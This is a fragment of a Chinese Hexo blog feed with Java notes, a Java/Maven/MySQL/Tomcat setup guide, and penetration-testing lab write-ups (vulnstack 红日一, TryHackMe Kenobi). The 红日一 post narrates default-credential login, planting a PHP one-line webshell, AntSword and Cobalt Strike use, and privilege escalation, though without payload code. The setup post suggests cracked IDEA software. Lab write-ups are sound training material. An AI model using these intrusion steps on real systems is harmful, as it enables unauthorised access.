function_">add</span><span class="hljs-params">(<span class="hljs-type">double</span> a,<span class="hljs-type">double</span> b)</span>&#123;<br>        <span class="hljs-keyword">return</span> a+b;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">calc</span> <span class="hljs-variable">mycalc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">calc</span>();<br>        System.out.printlb(mycalc.add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br>        <span class="hljs-comment">//后面以此类推</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-构造函数中的重载"><a href="#7-构造函数中的重载" class="headerlink" title="7.构造函数中的重载"></a>7.构造函数中的重载</h2><p>概念：</p><p>构造函数的重载是指在同一个类中定义多个构造函数，他们具有相同的名称但参数列表不同</p><p>解决的问题：</p><p>构造函数的重载解决了不同场景下对象初始化需求不同的问题。通过提供多个构造函数，使得用户能够选择适合自己需求的初始化方式。</p><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><h2 id="HASHMAP"><a href="#HASHMAP" class="headerlink" title="HASHMAP"></a>HASHMAP</h2><p>常用集合类</p><p>存储Key-Value键值对的集合</p><p>实现了Map接口</p><p>核心思想是通过对散列算法将键映射到存储桶</p><p><strong>键值对</strong>常见的数据结构，通常同于表示关联关系。</p><p>包含两部分：键（key）和值（value）</p><p>键是唯一的，通过键可以访问对应的值</p><p>常用get和put</p><p>一个获取，一个存入 </p><h2 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h2><p>java.lang包中的一个类，用于单线程环境下对字符串进行可变操作，避免使用String类时</p><h2 id="SringBuffer"><a href="#SringBuffer" class="headerlink" title="SringBuffer"></a>SringBuffer</h2><p>与StringBuilder类似</p><h2 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h2><p>输入输出流处理输入输出机制</p><p>分为字节流和字符流</p><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>所有类的根类</p><p>每个类都是Object类的子类，定义了一些基本的方法，如toString、equals和hashCode</p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础-环境配置</title>
    <link href="/2024/06/14/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/06/14/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="1-JDK"><a href="#1-JDK" class="headerlink" title="1.JDK"></a>1.JDK</h2><h3 id="什么是JDK"><a href="#什么是JDK" class="headerlink" title="什么是JDK"></a>什么是JDK</h3><p><a href="https://blog.csdn.net/qing_gee/article/details/102792349">什么是 JDK？_jdk是什么-CSDN博客</a></p><h3 id="JDK安装"><a href="#JDK安装" class="headerlink" title="JDK安装"></a>JDK安装</h3><p><strong><a href="https://www.oracle.com/java/technologies/downloads/#jdk22-windows">Java Downloads | Oracle</a></strong></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406141101689.png"></p><p>（有新版本就安新版本）</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406141105667.png"></p><p>在学习java的时候，我们可能需要经常切换java的版本，下面是一个.bat文件，根据自己的情况进行配置，就可以做到快捷切换java版本</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">set</span> JAVA_HOME=C:\Program Files\Java\jdk-<span class="hljs-number">1</span>.<span class="hljs-number">8</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">Path</span>=<span class="hljs-variable">%JAVA_HOME%</span>\bin;<span class="hljs-variable">%Path%</span><br><span class="hljs-built_in">echo</span> Java <span class="hljs-number">1</span>.<span class="hljs-number">8</span> activated.<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141114899.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141114674.png" alt="image-20240408210331991"></p><h2 id="2-MYSQL"><a href="#2-MYSQL" class="headerlink" title="2.MYSQL"></a>2.MYSQL</h2><p><a href="https://www.xp.cn/">小皮面板(phpstudy) - 让天下没有难配的服务器环境！ (xp.cn)</a></p><p>下载上述软件快速配置mysql，且利于快速切换版本</p><h2 id="3-MAVEN"><a href="#3-MAVEN" class="headerlink" title="3.MAVEN"></a>3.MAVEN</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Maven 是一个项目管理工具，它包含了一个项目对象模型（Project Object Model），反<br>映在配置中，就是一个 pom.xml 文件。是一组标准集合，一个项目的生命周期、一个<br>依赖管理系统，另外还包括定义在项目生命周期阶段的插件(plugin)以及目标(goal)。<br>当我们使用 Maven 的使用，通过一个自定义的项目对象模型，pom.xml 来详细描述我<br>们自己的项目。<br>简单来说，我们开发一个JavaWeb项目是需要加载很多依赖的，使用Maven可以便于管<br>理这些依赖。</p><p>pom.xml</p><p>POM是项目对象模型(Project Object Model)的简称,它是Maven项目中的文件，使用XML表<br>示，名称叫做 pom.xml 。该文件用于管理：源代码、配置文件、开发者的信息和角<br>色、问题追踪系统、组织信息、项目授权、项目的url、项目的依赖关系等等。Maven项<br>目中必须包含 pom.xml 文件。<br>需要导入的依赖应该在 pom.xml 中进行配置与填写。比如导入某些依赖，如下图所<br>示：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141130167.png"></p><p>project-  project 是 pom.xml 中描述符的根。 </p><p>modelVersion -  modelVersion 指定 pom.xml 符合哪个版本的描述符。maven 2  和 3 只能为 4.0.0。</p><p>parent - maven 支持继承功能。子 POM 可以使用  其配置。 </p><p>dependencies - 在dependencise中进行依赖配置 parent 指定父 POM ，然后继承 </p><p>groupId - 团体、组织的标识符。团体标识的约定是，它以创建这个项目的组织名称 的逆向域名(reverse domain name)开头。一般对应着 java 的包结构。 </p><p>artifactId -  单独项目的唯一标识符。比如我们的 tomcat、commons 等。不要在  artifactId 中包含点号(.)。 </p><p>version -  版本信息。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://www.runoob.com/maven/maven-setup.html">Maven 环境配置 | 菜鸟教程 (runoob.com)</a></p><p>值得一提的是，IDEA内置了MAVEN</p><h3 id="加速配置"><a href="#加速配置" class="headerlink" title="加速配置"></a>加速配置</h3><p>镜像配置</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141115511.png" alt="image-20240409114125175"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141115970.png" alt="image-20240409114207098"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>aliyunmaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>阿里云公共仓库<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br></code></pre></td></tr></table></figure><p>配置国内源下载一些依赖组件会非常快，但会有极个别情况，有些组件使用国内源无法<br>下载，则需要再更改配置，大家留有印象就好。<strong>（意思就是能用上面那种方法就用上面那种）</strong><br>①、访问 c:\Users\当前用户.m2 目录，当前用户文件夹需要根据当前用户来定，如<br>下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141116388.png" alt="image-20240408224429153"></p><p>②、打开 settings.xml 文件，复制粘贴以下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0</span></span><br><span class="hljs-string"><span class="hljs-tag">http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">pluginGroups</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">pluginGroups</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">proxies</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">proxies</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>C:\Users\当前用户\.m2\repository<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servers</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>aliyunmaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>阿里云公共仓库<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirrors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">profiles</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">profiles</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activeProfiles</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activeProfile</span>&gt;</span>nexus<span class="hljs-tag">&lt;/<span class="hljs-name">activeProfile</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activeProfiles</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="4-TomCat"><a href="#4-TomCat" class="headerlink" title="4.TomCat"></a>4.TomCat</h2><p><a href="https://tomcat.apache.org/">Apache Tomcat® - Welcome!</a></p><p>这个，然后是tomcat8</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141116496.png" alt="image-20240409115050063"></p><h2 id="5-IDEA"><a href="#5-IDEA" class="headerlink" title="5.IDEA"></a>5.IDEA</h2><p><a href="https://www.jetbrains.com/zh-cn/idea/download/download-thanks.html?platform=windows">感谢您下载IntelliJ IDEA！ (jetbrains.com)</a></p><p>这个是专业版，你可以使用三十天的试用，或是到网上找破解，某鱼也有</p><p>如果你是学生</p><p><a href="https://www.jetbrains.com/shop/eform/students">JetBrains 学习产品</a></p><p>我更推荐使用教育优惠，你可以通过教育邮箱&#x2F;学信网（学生证）进行申请，使你在JetBrains全部产品免费使用</p><h2 id="6-创建项目"><a href="#6-创建项目" class="headerlink" title="6.创建项目"></a>6.创建项目</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141117212.png" alt="img"></p><h2 id="7-Ubuntu环境配置"><a href="#7-Ubuntu环境配置" class="headerlink" title="7.Ubuntu环境配置"></a>7.Ubuntu环境配置</h2><p>（虚拟机安装，换源什么的）</p><p>自己百度吧，这个没什么好说的(我装的是20.04)</p><h2 id="8-安装mysql"><a href="#8-安装mysql" class="headerlink" title="8.安装mysql"></a>8.安装mysql</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>downloads.mysql.com<span class="hljs-regexp">/archives/</span>community/<br></code></pre></td></tr></table></figure><p>1、下载Mysql的deb包<br>Ubuntu中需要已安装 Wget ，如果没有可运行如下命令： apt install -y wget 。<br>然后命令行键入下面这条命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://dev.mysql.com/get/Downloads/MySQL-<span class="hljs-number">5</span>.<span class="hljs-number">7</span>/mysql-server_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<br><span class="hljs-attribute">1ubuntu18</span>.<span class="hljs-number">04</span>_amd64.deb-bundle.tar<br></code></pre></td></tr></table></figure><p>2、新建Mysql目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> mysql5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>3、将deb包挪到Mysql目录下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mv</span> mysql-server_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb-bundle.tar ./mysql5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>4、解压deb包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> mysql5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span><br><span class="hljs-attribute">sudo</span> tar -vxf mysql-server_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb-bundle.tar ./mysql5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span><br></code></pre></td></tr></table></figure><p>5、解压出来的deb安装包如下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">libmysqlclient20_5</span>.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-client_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-community-source_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-server_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-common_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-testsuite_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">libmysqlclient</span>-dev_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-community-client_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-community-server_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">libmysqld</span>-dev_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">mysql</span>-community-test_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br></code></pre></td></tr></table></figure><p>6、删除两个测试相关的包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> rm -f mysql-testsuite_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br><span class="hljs-attribute">sudo</span> rm -f mysql-community-test_5.<span class="hljs-number">7</span>.<span class="hljs-number">31</span>-<span class="hljs-number">1</span>ubuntu18.<span class="hljs-number">04</span>_amd64.deb<br></code></pre></td></tr></table></figure><p>7.安装相关依赖</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install libtinfo5<br>sudo apt-<span class="hljs-built_in">get</span> install libmecab2<br></code></pre></td></tr></table></figure><p>8、使用deb进行安装</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> dpkg -i mysql-<span class="hljs-regexp">*.deb</span><br></code></pre></td></tr></table></figure><p>此步骤会要求大家设置root账户密码，请注意。</p><p>9、测试是否成功安装<br>可在命令行中键入 mysql –version ，如果出现mysql版本，极为安装成功</p><h2 id="9-安装JDK1-8"><a href="#9-安装JDK1-8" class="headerlink" title="9.安装JDK1.8"></a>9.安装JDK1.8</h2><p>1、解压JDK到指定文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">mkdir</span> /usr/lib/jvm<br>sudo tar -zxvf jdk-8u202-linux-x64.tar.gz -C /usr/lib/jvm<br></code></pre></td></tr></table></figure><p>2、解压完成后，配置环境变量，使用gedit打开 ~&#x2F;.bashrc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gedit ~/.bashrc<br></code></pre></td></tr></table></figure><p>3、并在上面文本的末尾添加以下内容</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#set oracle jdk environment</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">JAVA_HOME</span>=/usr/lib/jvm/jdk1.8.0_202 ## 这里要注意目录要换成自己解压的<br>jdk 目录<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">JRE_HOME</span>=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/jre<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">CLASSPATH</span>=.:$&#123;JAVA_HOME&#125;/lib:<span class="hljs-variable">$&#123;JRE_HOME&#125;</span>/lib<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/bin:$PATH<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141116333.png" alt="image-20240408232216954"></p><p>4、重启配置文件，使其生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p>5、测试JDK是否成功安装</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">java -<span class="hljs-built_in">version</span><br>javac -<span class="hljs-built_in">version</span><br></code></pre></td></tr></table></figure><h2 id="10-安装Tomcat"><a href="#10-安装Tomcat" class="headerlink" title="10.安装Tomcat"></a>10.安装Tomcat</h2><p>Tomcat官方下载地址：</p><p><a href="https://tomcat.apache.org/download-80.cgi">https://tomcat.apache.org/download-80.cgi</a></p><p>注意：我们平常使用选择 Binary Distributions 即可，该版本是已编译好可直接使<br>用的程序。他下面的子类，我们选择 core版本 ，如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141116888.png" alt="image-20240408232615857"></p><p>下载完成后的Tomcat，进入 bin 目录选择对应启动文件即可启动。<br>Linux： startup.sh<br>Winodws： startup.bat<br>Linux启动成功如下图所示：</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202406141116302.png" alt="image-20240408233000742"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>红日一</title>
    <link href="/2024/06/13/%E7%BA%A2%E6%97%A51/"/>
    <url>/2024/06/13/%E7%BA%A2%E6%97%A51/</url>
    
    <content type="html"><![CDATA[<h1 id="内网靶场-1-WP"><a href="#内网靶场-1-WP" class="headerlink" title="内网靶场-1 WP"></a>内网靶场-1 WP</h1><p>连接上vpn，先对端口一顿扫</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132100266.png" alt="image-20240610202938674"></p><p>看到80，基本上是要访问web端，然后看到139，445基本就是永恒之蓝，1000+的不是很清楚，但3306肯定是数据库</p><p>这里不想这么多，开nmap进行详细扫的同时看看web端</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132100939.png" alt="image-20240610203300739"></p><p>php探针，下面也有mysql连接测试，root&#x2F;root直接成功了，这里再扫扫目录</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132101124.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132101196.png"></p><p>nmap的结果，msrpc不是很了解有什么用，但没关系，我们有mysql账号密码了，连进去看看</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132101082.png"></p><p>进入phpmyadmin，phpmyadmin是有提权方式的，但我们还看到有个newyxcms，这里想试试yxcms能不能打，因为目录扫描没扫出来结果，这里我们自己fuzz一下试试</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132101675.png"></p><p>发现yxcms就能直接访问</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132101288.png"></p><p>我们也是直接在网页上看到了账号密码</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132102887.png"></p><p>成功进入后台</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132102246.png"></p><p>找到一个可以修改php代码的地方，直接写入php一句话木马</p><p><img src="/./../AppData/Roaming/Typora/typora-user-images/image-20240610204802400.png"></p><p>成功蚁剑连接</p><p>那我们也算是成功拿下</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132102104.png"></p><p>cs启动</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406132102678.png"></p><p>提个权</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>内网</tag>
      
      <tag>红日/vulnstack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY1-kenobi</title>
    <link href="/2024/06/13/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY1-kenobi/"/>
    <url>/2024/06/13/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY1-kenobi/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY1-kenobi"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY1-kenobi" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY1-kenobi"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY1-kenobi</h1><p><a href="https://tryhackme.com/r/room/kenobi">TryHackMe的 |克诺比 — TryHackMe | Kenobi</a></p><h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h2><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955513.png"></p><p>打开网页，我们先连上vpn</p><p>我们只需要打开终端输入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">openvpn <span class="hljs-tag">&lt;<span class="hljs-name">文件名</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后ping一下thm给出的ip</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955516.png"></p><p>ping的通即可（如下）</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955514.png"></p><p>然后就可以开始做题，一般来说这种打靶第一步就是先进行信息收集，然后信息收集第一步就是扫描端口</p><p>正如它给出的题目，使用nmap扫描机器来看开放了多少端口，nmap是渗透测试中常用的端口扫描工具</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955517.png"></p><p>我们可以通过百度来了解它的基本信息，这里就不多介绍，但我这次并不用nmap进行端口扫描，因为它扫描全端口需要较长的时间，而是采用rustscan，因为kali并不自带rustscan，这里再贴个安装教程</p><p><a href="https://blog.csdn.net/weixin_41657089/article/details/131800802">https://blog.csdn.net/weixin_41657089/article/details/131800802</a></p><p>我写这篇文章的时候国内docker因不可抗力原因都寄了，不知道以后会怎样，所以还是推荐装到自己kali上，也方便用</p><p>ok，开始扫描</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">rustscan</span> -a &lt;<span class="hljs-built_in">ip</span>&gt;<br></code></pre></td></tr></table></figure><p>就用这个指令就行，简单粗暴</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955518.png"></p><p>这里先简单分析下不同端口的意义</p><table><thead><tr><th>端口</th><th>作用</th></tr></thead><tbody><tr><td>21</td><td>ftp端口，通常用于文件传输</td></tr><tr><td>22</td><td>SSH端口，通常用于远程连接</td></tr><tr><td>80</td><td>HTTP端口，一般网页就在这个端口</td></tr><tr><td>139</td><td>TCP端口，用于访问局域网中共享文件或共享打印机</td></tr><tr><td>445</td><td>被文件和打印机共享服务使用</td></tr></tbody></table><p>更多的可以看下面两个</p><p><a 